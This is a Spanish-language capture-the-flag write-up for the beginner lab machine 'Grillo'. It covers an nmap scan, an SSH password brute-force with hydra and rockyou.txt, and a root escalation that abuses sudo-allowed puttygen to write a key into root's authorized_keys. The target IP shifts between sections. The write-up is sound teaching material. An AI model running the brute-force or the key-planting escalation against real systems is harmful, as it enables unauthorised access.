---
title: 'The Hackers Labs: '
titleIcon: '/thl.png'
tags: [ 'Linux', 'Fuerza Bruta', 'SSH', 'Puttygen', 'Escalada de Privilegios' ]
categories: [ 'CTF', 'The Hackers Labs', 'Principiante', 'Linux' ]
description: |
  Grillo es una máquina de nivel principiante en The Hackers Labs. A través del reconocimiento inicial y el análisis del servicio web, encontramos una pista útil para continuar. Luego, con algo de fuerza bruta y análisis de privilegios, logramos escalar hasta obtener la flag de root.
---

<font size='5'>Grillo</font>

Plataforma: `The Hackers Labs`

Dificultad: <font color='green'>Principiante</font>

# Reconocimiento

En esta etapa inicial realizamos un escaneo de puertos para identificar los servicios activos en la máquina objetivo. Utilizamos `Nmap` con parámetros específicos para lograr un análisis más detallado.

```bash
sudo nmap -p- --open -sS -sCV --min-rate 3000 -Pn -n -oN grillo.txt 192.168.100.7 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 19:35 -03
Nmap scan report for 192.168.100.7
Host is up (0.00097s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 00:0C:29:51:25:FE (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
```

**Detalles del comando:**

- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sCV`: Usa scripts por defecto y detectar versiones de servicios.
- `--min-rate 5000`: Establece un ritmo mínimo de escaneo.
- `-n`: Desactiva la resolución DNS.
- `-Pn`: Omite la detección de hosts activos.
- `-oN Escaneo`: Guarda los resultados en el archivo "Escaneo".

**Puertos descubiertos:**

- 22/tcp - SSH (OpenSSH 9.2p1)
- 80/tcp - HTTP (Apache 2.4.57)

---

## Exploración Web

Ingresamos al sitio mediante el navegador accediendo a la IP descubierta en el escaneo. Nos encontramos con la página por defecto de Apache en Debian. Revisando el código fuente de la página, encontramos una pista interesante:

> "Cambia la contraseña de ssh por favor melanie."

![Página por defecto](/thl/principiante/grillo/defaul-page.png)


---

## Explotación

Aplicamos fuerza bruta al servicio SSH usando el usuario `melanie` y el diccionario `rockyou.txt`:

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.3 -F
```

Se encuentra la contraseña válida: **trustno1**

---

## Escalada de Privilegios

Una vez dentro de la máquina, verificamos permisos con:

```bash
sudo -l
```

Descubrimos que podemos ejecutar `puttygen` como root.

### Uso de puttygen para escalar

Puttygen se utiliza para generar claves SSH. Generamos una clave para root con los siguientes pasos:

```bash
puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id
sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
scp melanie@192.168.1.3:/home/melanie/.ssh/id .
ssh -i id root@192.168.1.3
```

Con esto obtenemos acceso completo como root.

---

## 🎉 ¡Root conseguido!

Hemos completado exitosamente la máquina **Grillo** de TheHackersLabs.
